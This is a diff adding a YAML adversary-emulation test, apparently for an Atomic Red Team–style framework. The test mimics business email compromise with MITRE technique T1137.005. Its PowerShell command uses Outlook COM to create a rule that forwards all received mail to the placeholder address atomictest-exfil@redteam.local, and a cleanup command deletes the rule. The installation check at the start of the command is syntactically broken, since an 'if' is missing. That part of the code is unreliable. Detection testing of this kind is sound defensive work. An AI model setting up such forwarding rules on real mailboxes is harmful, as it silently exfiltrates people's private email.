@@ -1,0 +1,63 @@
+---
+- id: 05755581b361ca67b4ff7acdb284352b
+  name: Outlook Rule - Auto-Forward Emails to External Address via COM Object
+  description: 'Creates an Outlook rule that automatically forwards all received emails
+    to
+
+    an external address. Simulates Business Email Compromise (BEC) and insider
+
+    threat scenarios where adversaries establish forwarding rules to exfiltrate
+
+    mail. One of the most commonly observed real-world abuses of Outlook rules.
+
+    Detected by Exchange mail flow anomalies and Microsoft Secure Score
+
+    forwarding alerts.
+
+    NOTE: No actual email is forwarded during this test - the rule is created
+
+    but a trigger email is not sent. Run cleanup immediately after verification.
+
+    NOTE: This test MUST be run from a non-elevated (standard user) PowerShell
+
+    session. Outlook COM fails with 0x80080005 when invoked as Administrator.
+
+    '
+  tactic: persistence
+  technique:
+    attack_id: T1137.005
+    name: 'Office Application Startup: Outlook Rules'
+  platforms:
+    windows:
+      psh:
+        command: '$clsid = (Get-ItemProperty "REGISTRY::HKEY_CLASSES_ROOT\Outlook.Application\CLSID"
+          -ErrorAction SilentlyContinue) { ; } else {Write-Host "[-] Classic Outlook
+          is not installed or COM is not registered."; Write-Host "    Install Microsoft
+          365 Apps with Classic Outlook before running this test."; Write-Host "    Note:
+          The new Outlook for Windows does NOT support COM automation."; exit 1};  $isAdmin
+          = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator");
+          if ($isAdmin) {;     Write-Host "[-] This test must be run from a non-elevated
+          PowerShell session.";     Write-Host "    Outlook COM fails with 0x80080005
+          when run as Administrator.";     exit 1; }; $outlook   = New-Object -ComObject
+          Outlook.Application; $namespace = $outlook.GetNamespace("MAPI"); $rules     =
+          $namespace.DefaultStore.GetRules(); $rule      = $rules.Create("AtomicTest_T1137005_ForwardExfil",
+          0); $action = $rule.Actions.Forward; $action.Enabled = $true; $action.Recipients.Add("atomictest-exfil@redteam.local");
+          $action.Recipients.ResolveAll() | Out-Null; $rule.Enabled = $true; $rules.Save();
+          Write-Host "[+] Auto-forward rule ''AtomicTest_T1137005_ForwardExfil'' created
+          -> atomictest-exfil@redteam.local"; Write-Host "[!] Run cleanup immediately
+          after verifying rule creation in Outlook."'
+        payloads: []
+        cleanup: $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator");
+          if ($isAdmin) {;     Write-Host "[-] Cleanup must be run from a non-elevated
+          PowerShell session. Skipping.";     exit 1; }; $outlook   = New-Object -ComObject
+          Outlook.Application; $namespace = $outlook.GetNamespace("MAPI"); $rules     =
+          $namespace.DefaultStore.GetRules(); $removed   = $false; for ($i = $rules.Count;
+          $i -ge 1; $i--) {;     if ($rules.Item($i).Name -eq "AtomicTest_T1137005_ForwardExfil")
+          {;         $rules.Remove($rules.Item($i).Name);         $removed = $true;     };
+          }; if ($removed) {;     $rules.Save();     Write-Host "[+] All instances
+          of forwarding rule 'AtomicTest_T1137005_ForwardExfil' removed."; } else
+          {;     Write-Host "[*] Rule 'AtomicTest_T1137005_ForwardExfil' not found
+          - already removed."; }
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
